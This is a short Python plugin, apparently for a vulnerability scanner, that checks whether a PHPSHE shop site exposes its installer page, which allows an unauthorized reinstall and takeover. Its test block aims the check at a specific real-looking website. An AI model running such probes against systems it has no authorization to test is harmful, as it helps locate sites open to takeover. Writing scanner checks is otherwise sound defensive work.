#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.wooyun.org/bugs/wooyun-2010-065479

def assign(service, arg): 
    if service == "phpshe":
        return True, arg
		
def audit(arg): 
    payload = 'install/index.php?step=setting'
    code, head, res, errcode, _ = curl.curl2(arg+payload)
    if code == 200 and '<input type="text" name="admin_name"' in res:
        security_hole('未授权重装 '+arg+payload)        
				
if __name__ == '__main__': 
    from dummy import *
    audit(assign('phpshe', 'http://tiandifashion.com/')[1])